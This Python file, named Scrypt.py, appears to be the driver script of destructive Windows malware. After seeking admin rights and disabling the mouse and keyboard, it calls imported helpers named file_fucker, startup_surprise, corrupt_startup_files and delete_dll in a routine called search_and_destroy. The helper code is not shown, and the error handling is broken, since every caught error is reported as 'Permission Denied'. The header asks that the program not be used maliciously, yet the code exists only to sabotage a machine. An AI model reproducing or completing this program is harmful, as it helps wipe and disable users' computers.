"""
name: Scrypt.py -> Scrypt.exe
version: 0.0.1 (Beta)
release: (Unreleased::Beta) 2023
author: itzCozi (https://github.com/itzCozi)

This program is free software; you can do whatever you want with it.
Though, please do not use it for illegal purposes or maliciously.
"""
import time

from resource import functions, Ptime, hash

# Sequencing
def start():
  try:
    functions.become_admin()
    functions.minimize_current_window()
    functions.disable_mouse_keyboard_windows()

    retitem = True
    time.sleep(2)

  except:
    retitem = False
    if PermissionError:
      print("Error: Permission Denied :", Ptime.nowtime())
    else:
      print("Error: Unknown :", Ptime.nowtime())

  return retitem


def search_and_destroy():
  try:

    try:
      functions.file_fucker()
    except:
      if PermissionError:
        print("Error: [file_fucker()] Permission Denied :", Ptime.nowtime())
      else:
        print("Error: Unknown :", Ptime.nowtime())
        time.sleep(1)

    functions.startup_surprise()
    functions.corrupt_startup_files()
    functions.delete_dll()
    retitem = True

  except:
    retitem = False
    if PermissionError:
      print("Error: Permission Denied :", Ptime.nowtime())
    else:
      print("Error: Unknown :", Ptime.nowtime())

  return retitem


try:
  if start():
    if search_and_destroy():
      print("Scrypt: Success")
    else:
      print("Scrypt: [search&destroy()] Failed :", Ptime.nowtime())
  else:
    print("Scrypt: [start()] Failed :", Ptime.nowtime())

except:
  print("Scrypt: [Global] Failed :", Ptime.nowtime())
